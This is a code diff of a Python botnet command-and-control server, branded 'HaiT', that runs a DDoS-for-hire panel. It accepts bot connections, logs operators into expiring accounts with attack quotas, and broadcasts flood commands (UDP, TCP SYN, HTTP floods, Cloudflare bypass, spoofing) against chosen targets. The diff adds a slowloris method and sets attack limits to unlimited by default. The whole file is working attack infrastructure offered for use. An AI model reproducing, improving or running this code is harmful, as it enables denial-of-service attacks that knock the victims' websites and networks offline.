@@ -1,10 +1,10 @@
-HOST = '0.0.0.0'
-PORT = 1002
-CONTROL_PORT = 2323
 import socket
 import time
 import threading
 from datetime import datetime
+HOST = '0.0.0.0'
+PORT = 1002
+CONTROL_PORT = 2323
 GREEN = "\033[32m"
 RED = "\033[31m"
 YELLOW = "\033[33m"
@@ -22,7 +22,6 @@ active_users = {}
 active_users_lock = threading.Lock()
 confirmation_count = 0
 confirmation_lock = threading.Lock()
-
 def load_accounts():
     accounts = {}
     try:
@@ -33,9 +32,9 @@ def load_accounts():
                     parts = line.split(':')
                     if len(parts) >= 3:
                         user, password, expiry = parts[:3]
-                        max_attacks = int(parts[3]) if len(parts) > 3 else 1
-                        max_time = int(parts[4]) if len(parts) > 4 else 60
-                        max_threads = int(parts[5]) if len(parts) > 5 else 100
+                        max_attacks = int(parts[3]) if len(parts) > 3 else float('inf')
+                        max_time = int(parts[4]) if len(parts) > 4 else float('inf')
+                        max_threads = int(parts[5]) if len(parts) > 5 else float('inf')
                         accounts[user] = {
                             'password': password,
                             'expiry': expiry,
@@ -47,12 +46,10 @@ def load_accounts():
     except FileNotFoundError:
         print(f"{RED}[-] File lg.txt not found. Create it with format 'user:pass:dd/mm/yyyy:max_attacks:max_time:max_threads'{RESET}")
     return accounts
-
 def save_accounts(accounts):
     with open('lg.txt', 'w') as f:
         for user, data in accounts.items():
             f.write(f"{user}:{data['password']}:{data['expiry']}:{data['max_attacks']}:{data['max_time']}:{data['max_threads']}\n")
-
 def check_login(username, password, accounts):
     if username not in accounts:
         return False, "Invalid username or password"
@@ -61,11 +58,7 @@ def check_login(username, password, accounts):
     expiry_date = datetime.strptime(accounts[username]['expiry'], '%d/%m/%Y')
     if datetime.now() > expiry_date:
         return False, "Account expired"
-    with active_users_lock:
-        if username in active_users:
-            return False, "Account already active"
     return True, "Authentication successful"
-
 def handle_client(client_socket, client_address):
     global clients, confirmation_count
     client_id = f"{client_address[0]}:{client_address[1]}"
@@ -73,6 +66,7 @@ def handle_client(client_socket, client_address):
         clients[client_id] = client_socket
         broadcast_to_control(f"{GREEN}[+] Bot connected: {client_address} | Total: {len(clients)}{RESET}")
     try:
+        client_socket.settimeout(15.0)
         while True:
             try:
                 data = client_socket.recv(1024).decode('utf-8').strip()
@@ -81,7 +75,7 @@ def handle_client(client_socket, client_address):
                 if data == "ATTACK_STARTED":
                     with confirmation_lock:
                         confirmation_count += 1
-            except Exception as e:
+            except Exception:
                 client_socket.send("PING\r\n".encode('utf-8'))
                 time.sleep(1)
     except:
@@ -91,7 +85,6 @@ def handle_client(client_socket, client_address):
         broadcast_to_control(f"{RED}[-] Bot disconnected: {client_address} | Total: {len(clients)}{RESET}")
     finally:
         client_socket.close()
-
 def broadcast_to_control(message):
     with control_lock:
         for client in control_clients[:]:
@@ -99,7 +92,6 @@ def broadcast_to_control(message):
                 client.send(f"{message}\r\n".encode('utf-8'))
             except:
                 control_clients.remove(client)
-
 def broadcast_command(command):
     global confirmation_count
     with confirmation_lock:
@@ -118,13 +110,12 @@ def broadcast_command(command):
         while time.time() - start_time < 5:
             time.sleep(0.1)
         broadcast_to_control(f"{GREEN}[+] Sent attack to {confirmation_count}/{total_bots} bots{RESET}")
-
 def show_help():
     return f"{MAGENTA}{BOLD}╔════════════════════════════╗\r\n" \
            f"║            HaiT            ║\r\n" \
            f"║        t.me/hiahihn        ║\r\n" \
            f"╚════════════════════════════╝{RESET}\r\n" \
-           f"{CYAN}Methods:{RESET} {WHITE}icmp, udp, tcpsyn, tcp, httpflood, httpstorm, httpcfb, httpio, httpspoof{RESET}\r\n" \
+           f"{CYAN}Methods:{RESET} {WHITE}icmp, udp, tcpsyn, tcp, httpflood, httpstorm, httpcfb, httpio, httpspoof, slowloris{RESET}\r\n" \
            f"{CYAN}Syntax:{RESET}  {WHITE}<method> <target> <port> <time> <threads>{RESET}\r\n" \
            f"{BLUE}Commands:{RESET}\r\n" \
            f"  {GREEN}cls{RESET}    - {YELLOW}Clear the screen{RESET}\r\n" \
@@ -132,43 +123,37 @@ def show_help():
            f"  {GREEN}help{RESET}   - {YELLOW}Display this menu{RESET}\r\n" \
            f"  {GREEN}getip{RESET}  - {YELLOW}Find all IPs of URL{RESET}\r\n" \
            f"  {GREEN}exit{RESET}   - {YELLOW}End session{RESET}\r\n"
-
 def handle_control_client(control_socket, address):
     global active_users, confirmation_count
     with control_lock:
         control_clients.append(control_socket)
     accounts = load_accounts()
-    
     control_socket.send(f"\x1b{MAGENTA}[*] Username:{RESET}\x1b[0m ".encode('utf-8'))
     username = ''
     while not username.strip():
         username = control_socket.recv(1024).decode('utf-8').strip()
-    
     control_socket.send(f"\x1b{MAGENTA}[*] Password:{RESET}\x1b[0;38;2;0;0;0m ".encode('utf-8'))
     password = ''
     while not password.strip():
         password = control_socket.recv(1024).decode('utf-8').strip()
-    
     is_valid, message = check_login(username, password, accounts)
     if not is_valid:
         control_socket.send(f"{RED}[-] {message}{RESET}\r\n".encode('utf-8'))
         time.sleep(3)
         control_socket.close()
         return
-    
     control_socket.send(f"{GREEN}[+] {message}{RESET}\r\n".encode('utf-8'))
     with active_users_lock:
+        if username in active_users:
+            del active_users[username]
         active_users[username] = control_socket
-    
     user_data = accounts[username]
     expire = user_data['expiry']
     max_attacks = user_data['max_attacks']
     max_time = user_data['max_time']
     max_threads = user_data['max_threads']
-    
     title = f"\033]0;HaiT | UserName: {username} | Expire: {expire} | Max Attacks: {max_attacks} | Max Time: {max_time} | Max Threads: {max_threads}\007"
     control_socket.send(title.encode('utf-8'))
-    
     control_socket.send("\033[2J\033[H".encode('utf-8'))
     welcome_msg = f"{CYAN}{BOLD}╔═══════════════════════════════════════════════════════════════════╗\r\n" \
                   f"  Welcome to HaiT, you will expire on {GREEN}{expire}{CYAN}  \r\n" \
@@ -176,28 +161,27 @@ def handle_control_client(control_socket, address):
                   f"╚═══════════════════════════════════════════════════════════════════╝{RESET}\r\n" \
                   f"{YELLOW}Type 'help' for commands{RESET}\r\n"
     control_socket.send(welcome_msg.encode('utf-8'))
-    
-    attack_methods = {"icmp", "udp", "tcpsyn", "tcp", "httpflood", "httpstorm", "httpcfb", "httpio", "httpspoof"}
-    
+    attack_methods = {"icmp", "udp", "tcpsyn", "tcp", "httpflood", "httpstorm", "httpcfb", "httpio", "httpspoof", "slowloris"}
     try:
         while True:
-            control_socket.send(f"{MAGENTA}[{RESET}HaiT@{username}{MAGENTA}]>{RESET} ".encode('utf-8'))
+            prompt = f"{MAGENTA}[{RESET}{username}@hait{MAGENTA}]{RESET} > "
+            control_socket.send(prompt.encode('utf-8'))
             data = ''
             while not data.strip():
                 data = control_socket.recv(1024).decode('utf-8').strip()
+                if not data:
+                    continue
             parts = data.split()
             cmd = parts[0].lower()
-            
             if cmd == "help":
                 control_socket.send(f"{show_help()}".encode('utf-8'))
-            elif cmd == "cls" or cmd == "clear":
+            elif cmd in {"cls", "clear"}:
                 control_socket.send("\033[2J\033[H".encode('utf-8'))
-            elif cmd == "bots" or cmd == "bot":
+            elif cmd in {"bots", "bot"}:
                 control_socket.send(f"{BLUE}[*] Bots Online: {WHITE}{len(clients)}{RESET}\r\n".encode('utf-8'))
             elif cmd == "exit":
                 control_socket.send(f"{YELLOW}[*] Session terminated{RESET}\r\n".encode('utf-8'))
-                control_socket.close()
-                return
+                break
             elif cmd == "getip":
                 if len(parts) != 2:
                     control_socket.send(f"{WHITE}[-] Syntax: getip <url>{RESET}\r\n".encode('utf-8'))
@@ -271,7 +255,6 @@ def handle_control_client(control_socket, address):
                     port = int(port)
                     seconds = int(seconds)
                     threads = int(threads)
-                    
                     if seconds > user_data['max_time']:
                         control_socket.send(f"{RED}[-] Time exceeds maximum allowed ({user_data['max_time']}s){RESET}\r\n".encode('utf-8'))
                         continue
@@ -281,29 +264,26 @@ def handle_control_client(control_socket, address):
                     if user_data['active_attacks'] >= user_data['max_attacks']:
                         control_socket.send(f"{RED}[-] Maximum active attacks reached ({user_data['max_attacks']}){RESET}\r\n".encode('utf-8'))
                         continue
-                    
                     user_data['active_attacks'] += 1
                     command_str = f"{method} {target} {port} {seconds} {threads}"
                     attack_msg = f"{YELLOW}[!] Attack launched\r\n" \
-                               f"{CYAN}Method:  {WHITE}{method}{RESET}\r\n" \
-                               f"{CYAN}Target:  {WHITE}{target}{RESET}\r\n" \
-                               f"{CYAN}Port:    {WHITE}{port}{RESET}\r\n" \
-                               f"{CYAN}Time:    {WHITE}{seconds}s{RESET}\r\n" \
-                               f"{CYAN}Threads: {WHITE}{threads}{RESET}"
+                                f"{CYAN}Method:  {WHITE}{method}{RESET}\r\n" \
+                                f"{CYAN}Target:  {WHITE}{target}{RESET}\r\n" \
+                                f"{CYAN}Port:    {WHITE}{port}{RESET}\r\n" \
+                                f"{CYAN}Time:    {WHITE}{seconds}s{RESET}\r\n" \
+                                f"{CYAN}Threads: {WHITE}{threads}{RESET}"
                     broadcast_to_control(attack_msg)
                     broadcast_command(command_str)
-                    
                     def decrease_attack():
                         time.sleep(seconds)
                         user_data['active_attacks'] -= 1
                     threading.Thread(target=decrease_attack, daemon=True).start()
-                    
                 except ValueError:
                     control_socket.send(f"{RED}[-] Port, time, and threads must be numbers{RESET}\r\n".encode('utf-8'))
             else:
                 control_socket.send(f"{RED}[-] Unknown command{RESET}\r\n".encode('utf-8'))
-    except Exception as e:
-        print(e)
+    except (ConnectionResetError, BrokenPipeError, Exception) as e:
+        print(f"[-] Connection lost for {username}: {str(e)}")
     finally:
         with control_lock:
             if control_socket in control_clients:
@@ -312,32 +292,26 @@ def handle_control_client(control_socket, address):
             if username in active_users:
                 del active_users[username]
         control_socket.close()
-
 def main():
     bot_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     bot_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     bot_server.bind((HOST, PORT))
-    bot_server.listen(100)
+    bot_server.listen(0)
     print(f"{GREEN}[+] Bot listener on {HOST}:{PORT}{RESET}")
-    
     control_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     control_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     control_server.bind((HOST, CONTROL_PORT))
-    control_server.listen(10)
+    control_server.listen(0)
     print(f"{GREEN}[+] Control server on {HOST}:{CONTROL_PORT}{RESET}")
-    
     def accept_clients(server, handler):
         while True:
             client_socket, address = server.accept()
             thread = threading.Thread(target=handler, args=(client_socket, address))
             thread.daemon = True
             thread.start()
-    
     threading.Thread(target=accept_clients, args=(bot_server, handle_client), daemon=True).start()
     threading.Thread(target=accept_clients, args=(control_server, handle_control_client), daemon=True).start()
-    
     while True:
         time.sleep(1)
-
 if __name__ == "__main__":
     main()
